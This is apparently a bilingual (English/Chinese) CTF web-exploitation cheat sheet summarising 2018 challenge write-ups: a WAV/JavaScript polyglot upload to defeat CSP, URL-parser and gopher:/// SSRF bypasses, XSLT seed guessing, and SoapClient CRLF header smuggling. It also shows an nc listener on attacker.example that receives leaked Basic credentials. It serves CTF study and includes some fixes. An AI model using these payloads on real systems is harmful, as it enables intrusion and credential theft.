# CTF Web - Polyglot, URL Tricks and SSRF Leaks

CVE-era and 2018-era advanced server-side techniques (CSAW, 35C3, ASIS, PlaidCTF). For path traversal / SSRF / upload and parser-wrapper branches, see path-traversal-ssrf-upload-and-rsc.md and parser-wrapper-and-legacy-ssrf-tricks.md.

## 阅读定位

- 本卷是一个 **短补卷**，更像按年代补入的 2018 附近案例集。
- 只有当前线索和这里的案例族高度相似时才读；否则优先读主卷或 `-2`。


## Table of Contents
- [WAV Polyglot Upload Bypass via .wave Extension (PlaidCTF 2018)](#wav-polyglot-upload-bypass-via-wave-extension-plaidctf-2018)
- [Multi-Slash URL Parser `path.startswith` Bypass (CSAW 2018 Finals)](#multi-slash-url-parser-pathstartswith-bypass-csaw-2018-finals)
- [Xalan XSLT math:random() Seed Guess (35C3 2018)](#xalan-xslt-mathrandom-seed-guess-35c3-2018)
- [SoapClient _user_agent CRLF Method Smuggling (35C3 2018)](#soapclient-_user_agent-crlf-method-smuggling-35c3-2018)
- [`gopher://` No-Host URL Scheme Bypass (35C3 2018)](#gopher-no-host-url-scheme-bypass-35c3-2018)
- [SSRF Credential Leak via Attacker-Specified Outbound URL (ASIS Finals 2018)](#ssrf-credential-leak-via-attacker-specified-outbound-url-asis-finals-2018)

---

---

## WAV Polyglot Upload Bypass via .wave Extension (PlaidCTF 2018)

**模式（idIoT: Action）：** Site accepts `ogg/wav/wave/webm/mp3` uploads and validates by parsing the RIFF/WAVE header. CSP is `script-src 'self'`, so inline XSS fails, but a same-origin `<script src=...>` to an uploaded file would run. Browsers refuse to load responses whose Content-Type starts with `audio/`, yet Apache on many distros has no MIME mapping for the `.wave` extension and serves it as the default (usually `application/octet-stream` or with no `Content-Type`).

**Exploit build:**
1. Construct a file whose first bytes parse as a valid RIFF/WAVE container but whose `data` chunk contents open a JavaScript block comment and embed the payload.
2. Save with extension `.wave` (not `.wav`) so Apache does not label it as audio.
3. Inject `<script src="/uploads/evil.wave"></script>` via the existing XSS sink — the browser now executes the script from a same-origin URL, satisfying `script-src 'self'`.

```text
RIFF=1/*WAVEfmt ..........]................LIST....INFO
ISFT....Lavf57.83.100.data........................
........*/ ; alert(1);
```
Hex view (truncated): the first 4 bytes `52 49 46 46` still form `RIFF`; the quirky length field `3d 31 2f 2a` (`=1/*`) is valid for WAV parsers but also opens a JS comment that runs until the `*/ ;alert(1);` tail at the end of the `data` chunk.

**关键结论：** File-upload filters that only check magic bytes or MIME based on extension are defeated by any extension the web server has no explicit mapping for. Test each permitted extension against the server's MIME database (`mime.types`) — whichever one falls through to `application/octet-stream` becomes a script gadget under `script-src 'self'`. Fix by enforcing a strict response `Content-Type` for user uploads (e.g., `application/octet-stream` + `Content-Disposition: attachment`).

**参考：** PlaidCTF 2018 — writeup 10018

---

## Multi-Slash URL Parser `path.startswith` Bypass (CSAW 2018 Finals)

```text
# Filtered
http://127.0.0.1:5000/flaginfo
# Allowed
http://127.0.0.1:5000///flaginfo
```

**关键结论：** Filters that check the parsed URL differ from the resolver that ultimately routes the request. Always test `///`, `/./`, `%2f`, and `http:/127.0.0.1` permutations when the filter is a string-comparison, not a structural match.

**参考：** CSAW 2018 Finals — NekoCat, writeups 12130, 12144

---

## Xalan XSLT math:random() Seed Guess (35C3 2018)

```c
for (long base = time(NULL) - 1; base <= time(NULL) + 1; base++) {
    srand(base);
    for (int j = 0; j < 5; j++) {
        long long v = llround((double)rand() / RAND_MAX * 4294967296.0);
        /* compare with leaked values */
    }
}
```

**关键结论：** Any XSLT engine that exposes math extensions usually proxies straight to libc rand/srand; seeds are second-granularity time values and fall to a 3-value brute force.

**参考：** 35C3 CTF 2018 — Juggle, writeup 12803

---

## SoapClient _user_agent CRLF Method Smuggling (35C3 2018)

```php
$c = new SoapClient(null, [
    'location'   => 'http://target/soap',
    'uri'        => 'x',
    'user_agent' => "x\r\nX-Forwarded-For: 127.0.0.1\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
]);
$c->__soapCall('x', []);
```

**关键结论：** Any serialization gadget that lets you set a "magic" HTTP header string in a deserialized object becomes an HTTP smuggler. `SoapClient->_user_agent` and `SoapClient->_cookies` are the typical PHP gadgets for this.

**参考：** 35C3 CTF 2018 — post, writeup 12808

---

## `gopher://` No-Host URL Scheme Bypass (35C3 2018)

```text
gopher:///127.0.0.1:1433/_<raw TDS bytes>
```

**关键结论：** Always test every URL scheme against the validator both with and without `//host` because parser/validator mismatches are asymmetric. `gopher:///x`, `file:///x`, and `jar:file:///x` are the common scheme bypasses.

**参考：** 35C3 CTF 2018 — post, writeup 12808

---

## SSRF Credential Leak via Attacker-Specified Outbound URL (ASIS Finals 2018)

```http
# Listener (attacker side)
nc -lvnp 80

# Victim sends:
GET / HTTP/1.1
Host: attacker.example
Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6
```

**关键结论：** Any SSRF where the client library uses per-request credentials (`requests.auth`, `urllib3 auth_header`, Python `http.client` default credentials) leaks them if the attacker picks the target URL. Strip `Authorization` on redirects and never attach credentials by default.

**参考：** ASIS CTF Finals 2018 — Gunshop 2, writeup 12420
